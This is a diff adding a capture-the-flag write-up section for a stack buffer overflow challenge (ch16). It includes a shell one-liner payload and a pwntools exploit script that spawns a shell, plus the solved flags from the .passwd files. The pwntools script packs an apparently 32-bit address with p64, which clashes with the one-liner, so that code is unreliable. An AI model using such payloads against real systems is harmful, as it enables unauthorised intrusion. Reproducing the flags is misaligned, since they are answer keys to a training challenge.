@@ -48,5 +48,28 @@ And ``cat .passwd``
 
 We get ```B33r1sSoG0oD4y0urBr4iN```
 
+# ***STACK BUFFER OVERFLOW BASIC 3***
 
+From the given challenge we can give the buffer as 64 and giving the address of check we can get the interactive but here we don't get.
 
+The program reads one character each time it compares, it removes the cases of 0x04 , 0x90 and become subscript.
+
+Since it is removing those cases we can't fill the buffer, but as there subscript we can use negative numbers.
+
+```cat <(python -c "print '\x08\x08\x08\x08' + '\xbc\xfa\xff\xbf'") - | ./ch16```
+
+```
+from pwn import *
+io = process("./ch16")
+payload = b"\x08"*4
+payload += p64(0xbffffabc)
+io.sendline(payload)
+io.interactive()
+```
+For both the exploits we get the shell
+
+Then do ``ls -al``.
+
+And ``cat .passwd``
+
+We get ```Sm4shM3ify0uC4n```
